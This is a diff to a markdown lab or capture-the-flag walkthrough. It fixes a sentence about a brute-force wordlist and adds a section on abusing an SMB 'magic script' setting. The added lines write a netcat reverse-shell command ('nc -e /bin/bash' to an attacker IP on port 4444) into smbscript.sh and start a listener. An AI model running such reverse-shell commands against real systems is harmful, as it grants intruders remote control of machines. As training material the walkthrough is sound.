@@ -48,7 +48,7 @@ and there you go.
 
 ![d4](https://user-images.githubusercontent.com/63744686/116488509-0c451180-a882-11eb-9d4e-1fa13ba80b4f.png)
 
-When the file is done extracting, you'll find in your curent directory a new directory created and named **results**. Inside this one, there's another directory named keepers in which there are somes files and among those file we find a wordlist, with it what we might expect is that soon it should come in handy while try to do a brute force attack.
+When the file is done extracting, you'll find in your curent directory a new directory created and named **results**. Inside this one, there's another directory named keepers in which there are somes files, and among those files we find a wordlist, with it what we might expect is that soon it should come in handy while try to do a brute force attack.
 bellow the wordlist file captured
 
 ![d5](https://user-images.githubusercontent.com/63744686/116489113-9e014e80-a883-11eb-92b6-816f0a52ea79.png)
@@ -98,7 +98,20 @@ Inside the local directory of albert, is a file called **user.txt** which contai
 
 ![d13](https://user-images.githubusercontent.com/63744686/116491371-39e18900-a889-11eb-9d37-9225856b34c9.png)
 
+While having a look to the smbshare directory, we notice that there is a smb.conf file inside. Looking at it, it's mentionned in the smbshare configuration that a user albert might be able to execute a magic script called **smbscript.sh**
 
+![d14](https://user-images.githubusercontent.com/63744686/116491828-516d4180-a88a-11eb-8871-3e9c235223f7.png)
+
+Knowing that, we can take advantage of it to create a **reverse TCP shell** and have an access to target machine. For that, all we have to do is used **netcat** command and create a reverse shell to the attacker machine, by simply puting in the smbscript.sh this line below
+
+**echo nc -e /bin/bash 192.168.56.108 4444 > smbscript.sh** (we shoud mentionned that the Ip address here is the Ip of the attacker machine)
+
+![d15](https://user-images.githubusercontent.com/63744686/116492301-744c2580-a88b-11eb-9aa5-2d0ad79fb51a.png)
+
+Before sending the payload to target machine, we have to start listening on the port we mentionned in the smbscript.sh, using the command **nc -lvp 4444**
+After that, we are ready to go!!
+
+![d16](https://user-images.githubusercontent.com/63744686/116492547-094f1e80-a88c-11eb-887c-daac03023fb2.png)
 
 
 
